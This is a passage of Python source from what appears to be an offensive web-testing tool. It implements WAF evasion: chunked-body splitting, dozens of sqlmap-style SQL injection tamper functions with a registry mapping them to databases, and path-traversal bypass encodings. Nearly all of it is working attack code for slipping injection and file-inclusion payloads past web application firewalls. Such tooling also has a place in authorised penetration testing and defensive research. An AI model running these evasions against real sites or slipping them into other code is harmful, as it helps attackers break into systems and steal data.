    Encode body_bytes as a proper HTTP chunked body using chunk_size-byte chunks.
    Each chunk: <HEX_LEN>\\r\\n<DATA>\\r\\n  terminated with: 0\\r\\n\\r\\n
    1-byte chunks force WAF pattern engines off keyword boundaries entirely.
    """
    out = bytearray()
    crlf = bytearray([13, 10])
    data = bytes(body_bytes)
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i + chunk_size]
        size_str = '%X' % len(chunk)
        out += bytearray(size_str.encode('ascii')) + crlf
        out += bytearray(chunk) + crlf
    out += bytearray(b'0') + crlf + crlf
    return out


def _is_post_request(raw_req):
    """Return True if the raw request starts with POST."""
    try:
        first_line = bytes(raw_req).split(b'\r\n')[0]
        return first_line.upper().startswith(b'POST')
    except Exception:
        return False


# ═══════════════════════════════════════════════════════════════════════════════
#   SQLMap-STYLE TAMPER FUNCTIONS
#   Each takes a raw SQL string and returns a WAF-evading variant.
#   Ported logic from sqlmapproject/sqlmap/tamper/*.py
# ═══════════════════════════════════════════════════════════════════════════════

import random as _random

_SQL_KEYWORDS = set([
    'SELECT','FROM','WHERE','AND','OR','UNION','ALL','ORDER','BY','GROUP',
    'HAVING','LIMIT','OFFSET','INSERT','INTO','VALUES','UPDATE','SET',
    'DELETE','DROP','CREATE','TABLE','DATABASE','SCHEMA','INDEX','VIEW',
    'IF','ELSE','CASE','WHEN','THEN','END','NOT','IN','LIKE','BETWEEN',
    'IS','NULL','TRUE','FALSE','AS','ON','JOIN','INNER','LEFT','RIGHT',
    'OUTER','CROSS','NATURAL','USING','EXISTS','DISTINCT','TOP','ROWNUM',
    'SLEEP','BENCHMARK','WAITFOR','DELAY','PG_SLEEP','DBMS_PIPE',
    'EXTRACTVALUE','UPDATEXML','EXP','CHAR','ASCII','HEX','UNHEX',
    'CONCAT','CONCAT_WS','GROUP_CONCAT','SUBSTR','SUBSTRING','MID',
    'LENGTH','UPPER','LOWER','TRIM','REPLACE','REVERSE','REPEAT',
    'LOAD_FILE','OUTFILE','DUMPFILE','INFORMATION_SCHEMA','COLUMNS',
    'TABLES','SCHEMATA','USER','VERSION','DATABASE','CURRENT_USER',
    'SESSION_USER','SYSTEM_USER','FLOOR','RAND','CONVERT','CAST',
    'COALESCE','IFNULL','ISNULL','GREATEST','LEAST','ELT','FIELD',
    'MAKE_SET','EXPORT_SET','GET_LOCK','RELEASE_LOCK','GTID_SUBSET',
    'JSON_KEYS','XMLTYPE','UTL_HTTP','DBMS_XPLAN',
    'EXEC','EXECUTE','SP_EXECUTESQL','XP_CMDSHELL','SP_PASSWORD',
    'OPENROWSET','OPENDATASOURCE','BULK','PIVOT','UNPIVOT',
    'BEGIN','DECLARE','PRINT','RAISERROR','ROLLBACK','COMMIT',
    'TRANSACTION','TRIGGER','PROCEDURE','FUNCTION','RETURN',
])


def _is_in_quotes(s, pos):
    """Return True if position pos inside s is within a quoted string."""
    in_single, in_double = False, False
    i = 0
    while i < pos:
        c = s[i]
        if c == "'" and not in_double:
            in_single = not in_single
        elif c == '"' and not in_single:
            in_double = not in_double
        elif c == '\\' and i + 1 < len(s):
            i += 1      # skip escaped char
        i += 1
    return in_single or in_double


def tamper_space2comment(sql):
    """Spaces → /**/   (skip spaces inside quotes)"""
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if c == ' ' and not _is_in_quotes(sql, i):
            out.append('/**/')
        else:
            out.append(c)
        i += 1
    return ''.join(out)


def tamper_space2plus(sql):
    """Spaces → +"""
    return sql.replace(' ', '+')


def tamper_space2dash(sql):
    """Spaces → --\\nN  (MySQL inline comment trick)"""
    return sql.replace(' ', '--\nN')


def tamper_space2hash(sql):
    """Spaces → #\\n  (MySQL only — hash comment + newline)"""
    return sql.replace(' ', '#\n')


def tamper_space2mssqlblank(sql):
    """Spaces → random MSSQL-accepted blank (%01 … %20)"""
    blanks = ['%01','%02','%03','%04','%05','%06','%07',
              '%08','%09','%0B','%0C','%0D','%0E','%0F',
              '%10','%11','%12','%13','%14','%15','%16',
              '%17','%18','%19','%1A','%1B','%1C','%1D',
              '%1E','%1F','%20']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2mysqlblank(sql):
    """Spaces → random MySQL-accepted blank (%09 %0A %0B %0C %0D)"""
    blanks = ['%09', '%0A', '%0B', '%0C', '%0D']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2randomblank(sql):
    """Spaces → one of several blank variants chosen randomly"""
    blanks = ['%09','%0A','%0C','%0D','%20','%A0','/**/','+']
    return ''.join(
        _random.choice(blanks) if c == ' ' else c for c in sql)


def tamper_space2morecomment(sql):
    """Spaces → /**_**/  (extended comment, confuses some WAF regex)"""
    return sql.replace(' ', '/**_**/')


def tamper_randomcase(sql):
    """Randomly capitalise SQL keywords."""
    def _rc(word):
        result = ''
        for c in word:
            result += c.upper() if _random.randint(0,1) else c.lower()
        # Guarantee mixed case
        if result == result.upper() or result == result.lower():
            mid = len(result) // 2
            result = result[:mid] + result[mid].swapcase() + result[mid+1:]
        return result

    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return _rc(w)
        return w

    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_uppercase(sql):
    """All SQL keywords → UPPERCASE."""
    def _replace(m):
        w = m.group(0)
        return w.upper() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_lowercase(sql):
    """All SQL keywords → lowercase."""
    def _replace(m):
        w = m.group(0)
        return w.lower() if w.upper() in _SQL_KEYWORDS else w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_charencode(sql):
    """URL-encode every char (skip already-encoded %XX triplets)."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        else:
            out.append('%%%02X' % ord(sql[i]))
            i += 1
    return ''.join(out)


def tamper_chardoubleencode(sql):
    """Double-URL-encode every char."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            # encode the % sign itself
            out.append('%25' + sql[i+1:i+3])
            i += 3
        else:
            pct = '%%%02X' % ord(sql[i])
            out.append('%25' + pct[1:])
            i += 1
    return ''.join(out)


def tamper_charunicodeencode(sql):
    """Unicode-encode alphanumeric chars as %uXXXX."""
    out = []
    for c in sql:
        if c.isalnum():
            out.append('%%u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_charunicodeescape(sql):
    """Unicode escape \\uXXXX for alphanumerics."""
    out = []
    for c in sql:
        if c.isalnum():
            out.append('\\u%04X' % ord(c))
        else:
            out.append(c)
    return ''.join(out)


def tamper_percentage(sql):
    """Add % before each non-space character (ASP/IIS bypass)."""
    out, i = [], 0
    while i < len(sql):
        if sql[i] == '%' and i+2 < len(sql) and all(
                c in '0123456789abcdefABCDEF' for c in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif sql[i] == ' ':
            out.append(' ')
            i += 1
        else:
            out.append('%' + sql[i])
            i += 1
    return ''.join(out)


def tamper_overlongutf8(sql):
    """Replace non-alphanumeric chars with overlong UTF-8 %C0%XX / %80%XX."""
    out, i = [], 0
    while i < len(sql):
        c = sql[i]
        if sql[i] == '%' and i+2 < len(sql) and all(
                x in '0123456789abcdefABCDEF' for x in sql[i+1:i+3]):
            out.append(sql[i:i+3])
            i += 3
        elif c.isalnum():
            out.append(c)
            i += 1
        else:
            b = ord(c)
            byte1 = 0xC0 + (b >> 6)
            byte2 = 0x80 + (b & 0x3F)
            out.append('%%%02X%%%02X' % (byte1, byte2))
            i += 1
    return ''.join(out)


def tamper_htmlencode(sql):
    """HTML-entity-encode all non-alphanumeric chars."""
    out = []
    for c in sql:
        if c.isalnum() or c == ' ':
            out.append(c)
        else:
            out.append('&#%d;' % ord(c))
    return ''.join(out)


def tamper_decentities(sql):
    """Decimal HTML entity encode EVERY character."""
    return ''.join('&#%d;' % ord(c) for c in sql)


def tamper_hexentities(sql):
    """Hex HTML entity encode every character."""
    return ''.join('&#x%X;' % ord(c) for c in sql)


def tamper_between(sql):
    """Replace = with BETWEEN and > with NOT BETWEEN (sqlmap between.py)."""
    # = B  →  BETWEEN B AND B
    sql = re.sub(r'=\s*(\w+)', r'BETWEEN \1 AND \1', sql)
    # > B  →  NOT BETWEEN 0 AND B
    sql = re.sub(r'>\s*(\w+)', r'NOT BETWEEN 0 AND \1', sql)
    return sql


def tamper_equaltolike(sql):
    """Replace = with LIKE."""
    return re.sub(r'(?<![<>!])=', ' LIKE ', sql)


def tamper_equaltorlike(sql):
    """Replace = with RLIKE (MySQL)."""
    return re.sub(r'(?<![<>!])=', ' RLIKE ', sql)


def tamper_greatest(sql):
    """Replace > with GREATEST()  per sqlmap greatest.py."""
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return m.group(0).split(lhs)[0] + lhs + ' GREATEST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*>\s*([\w().]+)', _repl, sql)


def tamper_least(sql):
    """Replace < with LEAST()."""
    def _repl(m):
        lhs = m.group(1).strip()
        rhs = m.group(2).strip()
        return lhs + ' LEAST(' + lhs + ',' + rhs + '+1)=' + lhs
    return re.sub(r'([\w().]+)\s*<\s*([\w().]+)', _repl, sql)


def tamper_modsecurityversioned(sql):
    """Wrap second half of payload in /*!3XREMAINDER*/ (sqlmap modsecurityversioned.py)."""
    # Find first space and wrap remainder
    idx = sql.find(' ')
    if idx < 0:
        return '/*!30000%s*/' % sql
    digit = str(_random.randint(0, 9))
    postfix = ''
    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!3%s000%s*/%s' % (sql[:idx], digit, sql[idx+1:], postfix)


def tamper_modsecurityzeroversioned(sql):
    """Wrap with /*!00000...*/."""
    idx = sql.find(' ')
    if idx < 0:
        return '/*!00000%s*/' % sql
    postfix = ''
    for suffix in ('--', '#', '/*'):
        if sql.rstrip().endswith(suffix):
            postfix = suffix
            sql = sql.rstrip()[:-len(suffix)].rstrip()
            break
    return '%s /*!00000%s*/%s' % (sql[:idx], sql[idx+1:], postfix)


def tamper_versionedmorekeywords(sql):
    """Wrap every SQL keyword in /*!KEYWORD*/ (sqlmap versionedmorekeywords.py)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!%s*/' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    result = result.replace(' /*!', '/*!').replace('*/ ', '*/')
    return result


def tamper_halfversionedmorekeywords(sql):
    """Prepend /*!0 before each keyword (MySQL < 5.1 syntax)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '/*!0%s' % w
        return w
    result = re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)
    return result.replace(' /*!0', '/*!0')


def tamper_multiplespaces(sql):
    """Replace spaces with multiple spaces (confuses token-based WAF)."""
    return sql.replace(' ', '    ')


def tamper_commentbeforeparentheses(sql):
    """Insert /**/ before every parenthesis."""
    return sql.replace('(', '/**/(')


def tamper_randomcomments(sql):
    """Insert /**/ at random point inside SQL keywords."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS and len(w) > 2:
            mid = _random.randint(1, len(w)-1)
            return w[:mid] + '/**/' + w[mid:]
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


def tamper_apostrophemask(sql):
    """' → %EF%BC%87  (UTF-8 fullwidth apostrophe)."""
    return sql.replace("'", '%EF%BC%87')


def tamper_apostrophenullencode(sql):
    """' → %00%27."""
    return sql.replace("'", '%00%27')


def tamper_unmagicquotes(sql):
    """' → %BF%27  (multibyte GBK injection for magic-quotes bypass)."""
    return sql.replace("'", '%bf%27%00')


def tamper_appendnullbyte(sql):
    """Append %00 (Access/old PHP null byte trick)."""
    return sql + '%00'


def tamper_bluecoat(sql):
    """Replace spaces after SQL keywords with %09 (tab — Bluecoat proxy bypass)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return w + '%09'
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b(?= )', _replace, sql)


def tamper_sp_password(sql):
    """Append sp_password — MSSQL audit log obfuscation."""
    return sql.rstrip() + ' sp_password'


def tamper_sleep2getlock(sql):
    """SLEEP(N) → GET_LOCK('a',N) — bypasses SLEEP-specific rules."""
    return re.sub(
        r'SLEEP\((\d+)\)',
        lambda m: "GET_LOCK('WafBreaker',%s)" % m.group(1),
        sql, flags=re.IGNORECASE)


def tamper_substring2mid(sql):
    """SUBSTRING → MID."""
    return re.sub(r'\bSUBSTRING\b', 'MID', sql, flags=re.IGNORECASE)


def tamper_concat2concatws(sql):
    """CONCAT(A,B) → CONCAT_WS(MID(CHAR(0),0,0),A,B)."""
    def _repl(m):
        inner = m.group(1)
        return "CONCAT_WS(MID(CHAR(0),0,0),%s)" % inner
    return re.sub(r'\bCONCAT\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ord2ascii(sql):
    """ORD() → ASCII()."""
    return re.sub(r'\bORD\(', 'ASCII(', sql, flags=re.IGNORECASE)


def tamper_informationschemacomment(sql):
    """Append inline comment to information_schema usages."""
    return re.sub(
        r'\binformation_schema\b',
        'information_schema/**/',
        sql, flags=re.IGNORECASE)


def tamper_schemasplit(sql):
    """Split schema.table with comment: db.table → db/**/./**/table."""
    return re.sub(r'(\w+)\.(\w+)', r'\1/**/./**/\2', sql)


def tamper_symboliclogical(sql):
    """AND → &&  / OR → ||  (symbolic operators)."""
    sql = re.sub(r'\bAND\b', '&&', sql, flags=re.IGNORECASE)
    sql = re.sub(r'\bOR\b',  '||', sql, flags=re.IGNORECASE)
    return sql


def tamper_misunion(sql):
    """UNION SELECT → UNION(SELECT — no space before SELECT."""
    return re.sub(r'\bUNION\s+SELECT\b', 'UNION(SELECT', sql, flags=re.IGNORECASE)


def tamper_0eunion(sql):
    """Prepend 0E0 to confuse UNION-detecting regex."""
    return re.sub(r'\bUNION\b', '0E0UNION', sql, flags=re.IGNORECASE)


def tamper_dunion(sql):
    """UNION → DUNION (MySQL quirk for some WAF patterns)."""
    return re.sub(r'\bUNION\b', '.UNION', sql, flags=re.IGNORECASE)


def tamper_scientific(sql):
    """Replace numeric literals with scientific notation: 1 → 1e0."""
    return re.sub(r'\b(\d+)\b', r'\1e0', sql)


def tamper_binary(sql):
    """Prepend BINARY to string comparisons for MySQL collation bypass."""
    return re.sub(r"='([^']*)'", r"=BINARY'\1'", sql)


# ── Wave-3 new tampers ────────────────────────────────────────────────────────

def tamper_versiongatedcomment(sql):
    """MySQL version-gated comment: SELECT → /*!50000SELECT*/
    WAFs see comment content as dead code; MySQL >=5.0.0 executes it.
    """
    keywords = ['SELECT', 'UNION', 'AND', 'OR', 'WHERE', 'FROM',
                'ORDER', 'GROUP', 'HAVING', 'LIMIT', 'INSERT', 'UPDATE']
    out = sql
    for kw in keywords:
        out = re.sub(r'(?i)\b' + kw + r'\b',
                     '/*!50000' + kw + '*/', out)
    return out


def tamper_dollarquoting(sql):
    """PostgreSQL dollar-quoting: 'string' → $$string$$
    Standard-quote WAF rules miss dollar-delimited literals.
    """
    return re.sub(r"'([^']*)'", r'$$\1$$', sql)


# Fullwidth unicode map (A-Z / a-z → U+FF21-U+FF3A / U+FF41-U+FF5A)
_FULLWIDTH_MAP = {}
for _i in range(0x41, 0x5B):   # A-Z
    _FULLWIDTH_MAP[chr(_i)] = chr(_i - 0x41 + 0xFF21)
for _i in range(0x61, 0x7B):   # a-z
    _FULLWIDTH_MAP[chr(_i)] = chr(_i - 0x61 + 0xFF41)


def tamper_fullwidthunicode(sql):
    """Replace ASCII SQL letters with Unicode fullwidth equivalents (U+FF21-U+FF5A).
    MySQL and some MSSQL parsers normalise fullwidth before parsing; WAF regex won't.
    """
    try:
        if not isinstance(sql, unicode):
            sql = sql.decode('utf-8', errors='replace')
        return u''.join(_FULLWIDTH_MAP.get(c, c) for c in sql)
    except NameError:
        return ''.join(_FULLWIDTH_MAP.get(c, c) for c in sql)


def tamper_nprefixquote(sql):
    """Prefix string literals with N: ' → N'
    MSSQL treats N-prefixed strings as Unicode; silently ignored by MySQL.
    Breaks WAF rules that match bare single-quote patterns.
    """
    return re.sub(r"(?<![N])(')", r"N\1", sql)


def tamper_execconcat(sql):
    """MSSQL EXEC with string concatenation: SELECT → EXEC('SE'+'LECT')
    Splits keywords across string literals; defeats keyword-boundary WAF rules.
    Only transforms top-level SELECT statements.
    """
    if re.search(r'\bSELECT\b', sql, re.IGNORECASE):
        obf = re.sub(r'\bSELECT\b',
                     "'SE'+'LECT'", sql, flags=re.IGNORECASE)
        return "EXEC(" + obf + ")"
    return sql


def tamper_json_inline(sql):
    """Claroty Team82 JSON-inline bypass: replace boolean conditions with
    JSON function equivalents. WAFs (Palo Alto, AWS, Cloudflare, F5, Imperva)
    do not parse JSON syntax in their SQL injection rule engines; MySQL,
    PostgreSQL, MSSQL, and SQLite execute JSON functions natively.
    Ref: Team82 research — bypassed all major commercial WAF vendors in 2022.

    Transforms:
        1=1           →  JSON_LENGTH('{}')<=8896
        1=0 / 0=1     →  JSON_LENGTH('{}')<0
        UNION SELECT  →  UNION distinctrow SELECT  (MySQL distinctrow
                         keyword confuses WAF UNION-SELECT patterns)
    """
    sql = re.sub(r'\b1\s*=\s*1\b',
                 "JSON_LENGTH('{}')<=8896", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\b1\s*=\s*0\b',
                 "JSON_LENGTH('{}')<0", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\b0\s*=\s*1\b',
                 "JSON_LENGTH('{}')<0", sql, flags=re.IGNORECASE)
    sql = re.sub(r'\bUNION\s+SELECT\b',
                 'UNION distinctrow SELECT', sql, flags=re.IGNORECASE)
    return sql


def tamper_if2case(sql):
    """IF(A,B,C) → CASE WHEN (A) THEN (B) ELSE (C) END."""
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'CASE WHEN (%s) THEN (%s) ELSE (%s) END' % tuple(args)
        return m.group(0)
    return re.sub(r'\bIF\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_ifnull2casewhenisnull(sql):
    """IFNULL(A,B) → CASE WHEN ISNULL(A) THEN (B) ELSE (A) END."""
    def _repl(m):
        args = m.group(1).split(',', 1)
        if len(args) == 2:
            a, b = args
            return 'CASE WHEN ISNULL(%s) THEN (%s) ELSE (%s) END' % (a, b, a)
        return m.group(0)
    return re.sub(r'\bIFNULL\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_unionalltounion(sql):
    """UNION ALL SELECT → UNION SELECT."""
    return re.sub(r'\bUNION\s+ALL\s+SELECT\b', 'UNION SELECT', sql, flags=re.IGNORECASE)


def tamper_plus2concat(sql):
    """+ → CONCAT() for MSSQL."""
    # Replace string concatenation + with {fn CONCAT}
    return re.sub(r"'([^']*)'\+", r"CONCAT('\1',", sql)


def tamper_commalesslimit(sql):
    """LIMIT M,N → LIMIT N OFFSET M."""
    return re.sub(
        r'\bLIMIT\s+(\d+)\s*,\s*(\d+)',
        r'LIMIT \2 OFFSET \1',
        sql, flags=re.IGNORECASE)


def tamper_commalessmid(sql):
    """MID(A,B,C) → MID(A FROM B FOR C)."""
    def _repl(m):
        args = m.group(1).split(',', 2)
        if len(args) == 3:
            return 'MID(%s FROM %s FOR %s)' % tuple(a.strip() for a in args)
        return m.group(0)
    return re.sub(r'\bMID\(([^)]+)\)', _repl, sql, flags=re.IGNORECASE)


def tamper_escapequotes(sql):
    """Backslash-escape single and double quotes."""
    return sql.replace("'", "\\'").replace('"', '\\"')


def tamper_hex2char(sql):
    """0xHH hex literals → CHAR(N) equivalents."""
    def _repl(m):
        val = int(m.group(1), 16)
        return 'CHAR(%d)' % val
    return re.sub(r'0x([0-9a-fA-F]{2})', _repl, sql)


def tamper_luanginx(sql):
    """Insert \\n before each keyword (Lua-Nginx WAF bypass)."""
    def _replace(m):
        w = m.group(0)
        if w.upper() in _SQL_KEYWORDS:
            return '\n' + w
        return w
    return re.sub(r'\b[A-Za-z_]{2,}\b', _replace, sql)


# ── Master tamper registry ────────────────────────────────────────────────────
# (name, function, description, applicable_db)
#   db: 'any', 'mysql', 'mssql', 'pgsql', 'oracle'

SQLI_TAMPERS = [
    # ── Space substitution ────────────────────────────────────────────────────
    ("space2comment",          tamper_space2comment,          "Spaces → /**/",                       "any"),
    ("space2plus",             tamper_space2plus,             "Spaces → +",                          "any"),
    ("space2dash",             tamper_space2dash,             "Spaces → --\\nN",                     "mysql"),
    ("space2hash",             tamper_space2hash,             "Spaces → #\\n",                       "mysql"),
    ("space2mssqlblank",       tamper_space2mssqlblank,       "Spaces → random %0X (MSSQL)",         "mssql"),
    ("space2mysqlblank",       tamper_space2mysqlblank,       "Spaces → random %0X (MySQL)",         "mysql"),
    ("space2randomblank",      tamper_space2randomblank,      "Spaces → random blank variant",       "any"),
    ("space2morecomment",      tamper_space2morecomment,      "Spaces → /**_**/",                    "any"),
    # ── Encoding ─────────────────────────────────────────────────────────────
    ("charencode",             tamper_charencode,             "URL-encode each char",                "any"),
    ("chardoubleencode",       tamper_chardoubleencode,       "Double URL-encode",                   "any"),
    ("charunicodeencode",      tamper_charunicodeencode,      "Unicode %uXXXX alphanums",            "any"),
    ("charunicodeescape",      tamper_charunicodeescape,      "\\uXXXX escape alphanums",            "any"),
    ("percentage",             tamper_percentage,             "%S%E%L%E%C%T — ASP/IIS bypass",       "mssql"),
    ("overlongutf8",           tamper_overlongutf8,           "Overlong UTF-8 non-alphanums",        "any"),
    ("htmlencode",             tamper_htmlencode,             "HTML entity non-alphanums",           "any"),
    ("decentities",            tamper_decentities,            "&#N; all characters",                 "any"),
    ("hexentities",            tamper_hexentities,            "&#xN; hex all characters",            "any"),
    # ── Case / comment ────────────────────────────────────────────────────────
    ("randomcase",             tamper_randomcase,             "sElEcT random casing",                "any"),
    ("uppercase",              tamper_uppercase,              "UPPERCASE keywords",                  "any"),
    ("lowercase",              tamper_lowercase,              "lowercase keywords",                  "any"),
    ("randomcomments",         tamper_randomcomments,         "SE/**/LECT mid-keyword comments",     "any"),
    ("multiplespaces",         tamper_multiplespaces,         "Multiple spaces between tokens",      "any"),
    ("commentbeforeparentheses",tamper_commentbeforeparentheses,"/**/ before ( — SLEEP/**/(5)",     "any"),
    ("bluecoat",               tamper_bluecoat,               "Keyword%09 — Bluecoat proxy",         "any"),
    ("luanginx",               tamper_luanginx,               "Newline before keywords (Lua-nginx)", "any"),
    # ── MySQL versioned comments ──────────────────────────────────────────────
    ("modsecurityversioned",    tamper_modsecurityversioned,    "/*!3XREMAINDER*/",                  "mysql"),
    ("modsecurityzeroversioned",tamper_modsecurityzeroversioned,"/*!00000REMAINDER*/",              "mysql"),
    ("versionedmorekeywords",   tamper_versionedmorekeywords,   "/*!KEYWORD*/ wrapping",             "mysql"),
    ("halfversionedmorekeywords",tamper_halfversionedmorekeywords,"/*!0KEYWORD prefixing",          "mysql"),
    # ── Operator substitution ─────────────────────────────────────────────────
    ("between",                tamper_between,                "= → BETWEEN, > → NOT BETWEEN",        "any"),
    ("equaltolike",            tamper_equaltolike,            "= → LIKE",                            "any"),
    ("equaltorlike",           tamper_equaltorlike,           "= → RLIKE (MySQL)",                   "mysql"),
    ("greatest",               tamper_greatest,               "> → GREATEST(A,B+1)=A",               "any"),
    ("least",                  tamper_least,                  "< → LEAST(A,B+1)=A",                  "any"),
    ("symboliclogical",        tamper_symboliclogical,        "AND→&& OR→||",                        "any"),
    # ── String/function substitution ──────────────────────────────────────────
    ("apostrophemask",         tamper_apostrophemask,         "' → %EF%BC%87 (fullwidth)",           "any"),
    ("apostrophenullencode",   tamper_apostrophenullencode,   "' → %00%27",                          "any"),
    ("unmagicquotes",          tamper_unmagicquotes,          "' → %BF%27 GBK multibyte",            "mysql"),
    ("escapequotes",           tamper_escapequotes,           "\\\\'  backslash-escape quotes",      "any"),
    ("appendnullbyte",         tamper_appendnullbyte,         "Append %00 null byte",                "any"),
    ("sp_password",            tamper_sp_password,            "Append sp_password (MSSQL log)",      "mssql"),
    ("sleep2getlock",          tamper_sleep2getlock,          "SLEEP → GET_LOCK (MySQL)",             "mysql"),
    ("substring2mid",          tamper_substring2mid,          "SUBSTRING → MID",                     "mysql"),
    ("concat2concatws",        tamper_concat2concatws,        "CONCAT → CONCAT_WS",                  "mysql"),
    ("ord2ascii",              tamper_ord2ascii,              "ORD → ASCII",                         "mysql"),
    ("informationschemacomment",tamper_informationschemacomment,"information_schema/**/ comment",   "mysql"),
    ("schemasplit",            tamper_schemasplit,            "db/**/./**/table schema split",       "any"),
    ("binary",                 tamper_binary,                 "BINARY prefix collation bypass",      "mysql"),
    ("if2case",                tamper_if2case,                "IF→CASE WHEN",                        "any"),
    ("ifnull2casewhenisnull",  tamper_ifnull2casewhenisnull,  "IFNULL→CASE WHEN ISNULL",             "any"),
    ("commalesslimit",         tamper_commalesslimit,         "LIMIT M,N → LIMIT N OFFSET M",        "any"),
    ("commalessmid",           tamper_commalessmid,           "MID(A,B,C) → MID(A FROM B FOR C)",    "any"),
    ("hex2char",               tamper_hex2char,               "0xHH → CHAR(N)",                      "any"),
    # ── UNION tricks ──────────────────────────────────────────────────────────
    ("0eunion",                tamper_0eunion,                "UNION → 0E0UNION",                    "any"),
    ("dunion",                 tamper_dunion,                 "UNION → .UNION",                      "mysql"),
    ("misunion",               tamper_misunion,               "UNION SELECT → UNION(SELECT",         "mysql"),
    ("unionalltounion",        tamper_unionalltounion,        "UNION ALL SELECT → UNION SELECT",     "any"),
    # ── Numeric obfuscation ───────────────────────────────────────────────────
    ("scientific",             tamper_scientific,             "1 → 1e0 numeric literals",            "mysql"),
    # ── New Wave-3 tampers ────────────────────────────────────────────────────
    ("versiongatedcomment",    tamper_versiongatedcomment,    "SELECT → /*!50000SELECT*/",            "mysql"),
    ("dollarquoting",          tamper_dollarquoting,          "'str' → $$str$$",                     "pgsql"),
    ("fullwidthunicode",       tamper_fullwidthunicode,       "SELECT → ＳＥＬＥＣＴ fullwidth",    "any"),
    ("nprefixquote",           tamper_nprefixquote,           "' → N' Unicode prefix",               "mssql,mysql"),
    ("execconcat",             tamper_execconcat,             "SELECT → EXEC('SE'+'LECT')",           "mssql"),
    # ── JSON-inline (Claroty Team82) ──────────────────────────────────────────
    ("jsoninline",             tamper_json_inline,            "1=1 → JSON_LENGTH('{}')<=8896 + distinctrow", "mysql,pgsql,mssql,sqlite"),
]


# ═══════════════════════════════════════════════════════════════════════════════
#   LFI BYPASS TRANSFORM FUNCTIONS
#   Each function takes a raw LFI path string and returns a WAF-evading variant.
#   Applied in Phase 2-M when _vtype == "LFI", then re-applied to every
#   subsequent payload via _apply_bypass() once a working bypass is confirmed.
# ═══════════════════════════════════════════════════════════════════════════════

def lfi_double_urlencode(path):
    """.->%252E  /->%252F  WAF decodes once (sees %2x); backend decodes again (gets .)"""
    return path.replace('.', '%252E').replace('/', '%252F').replace('\\', '%255C')


def lfi_double_urlencode_slash_only(path):
    """/->%252F  slash-only double-encode — the most targeted variant."""
    return path.replace('/', '%252F')


def lfi_unicode_u002f(path):
    """/->%u002f  IIS / some PHP setups normalise %uXXXX Unicode escapes."""
    return path.replace('/', '%u002f')


def lfi_unicode_u2215(path):
    """/->%u2215  DIVISION SLASH (U+2215), accepted as path separator on some parsers."""
    return path.replace('/', '%u2215')


def lfi_unicode_uff0f(path):
    """/->%uff0f  FULLWIDTH SOLIDUS (U+FF0F) — framework normalisation bypass."""
    return path.replace('/', '%uff0f')


def lfi_overlong_c0af(path):
    """/->%c0%af  classic two-byte overlong UTF-8 encoding."""
    return path.replace('/', '%c0%af')


def lfi_overlong_e080af(path):
    """/->%e0%80%af  three-byte overlong UTF-8 encoding."""
    return path.replace('/', '%e0%80%af')


def lfi_encoded_dotslash_full(path):
    """../->%2e%2e%2f  both dots and slash URL-encoded."""
    return path.replace('../', '%2e%2e%2f').replace('..\\', '%2e%2e%5c')


def lfi_encoded_dotslash_dotonly(path):
    """../->%2e%2e/  only dots encoded, slash stays literal."""
    return path.replace('../', '%2e%2e/').replace('..\\', '%2e%2e\\')


def lfi_dot_slash_mixed_enc(path):
    """../->%2e./  first dot encoded, second plain."""
    return path.replace('../', '%2e./')


def lfi_mixed_slash_enc(path):
    """../-> .%2F./  slash in the middle encoded."""
    return path.replace('../', '.%2F./')


def lfi_dotdot_double_slash(path):
    """../->....//  after WAF strips one '../', string becomes '../'."""
    return path.replace('../', '....//')


def lfi_dotdot_triple_slash(path):
    """../->....//// deeper variant; survives aggressive strip-once."""
    return path.replace('../', '.....///')


def lfi_semicolon_sep(path):
    """../->..;/  Java / Tomcat path parameter separator trick."""
    return path.replace('../', '..;/')


def lfi_path_params(path):
    """../->..;x=y/  fake path parameter breaks WAF token detection."""
    return path.replace('../', '..;x=y/')


def lfi_valid_prefix(path):
    """Prefix a plausible segment: images/../../ — WAF sees valid start, misses traversal."""
    if not path.startswith('php://') and not path.startswith('/'):
        return 'images/' + path
    return path


def lfi_extra_slash(path):
    """/->// double slashes normalise on filesystem but confuse simple regex WAFs."""
    return path.replace('../', '..//').replace('/', '//')


def lfi_backslash(path):
    """/->\\  Windows paths; accepted by some Linux servers and PHP on Windows."""
    return path.replace('/', '\\')


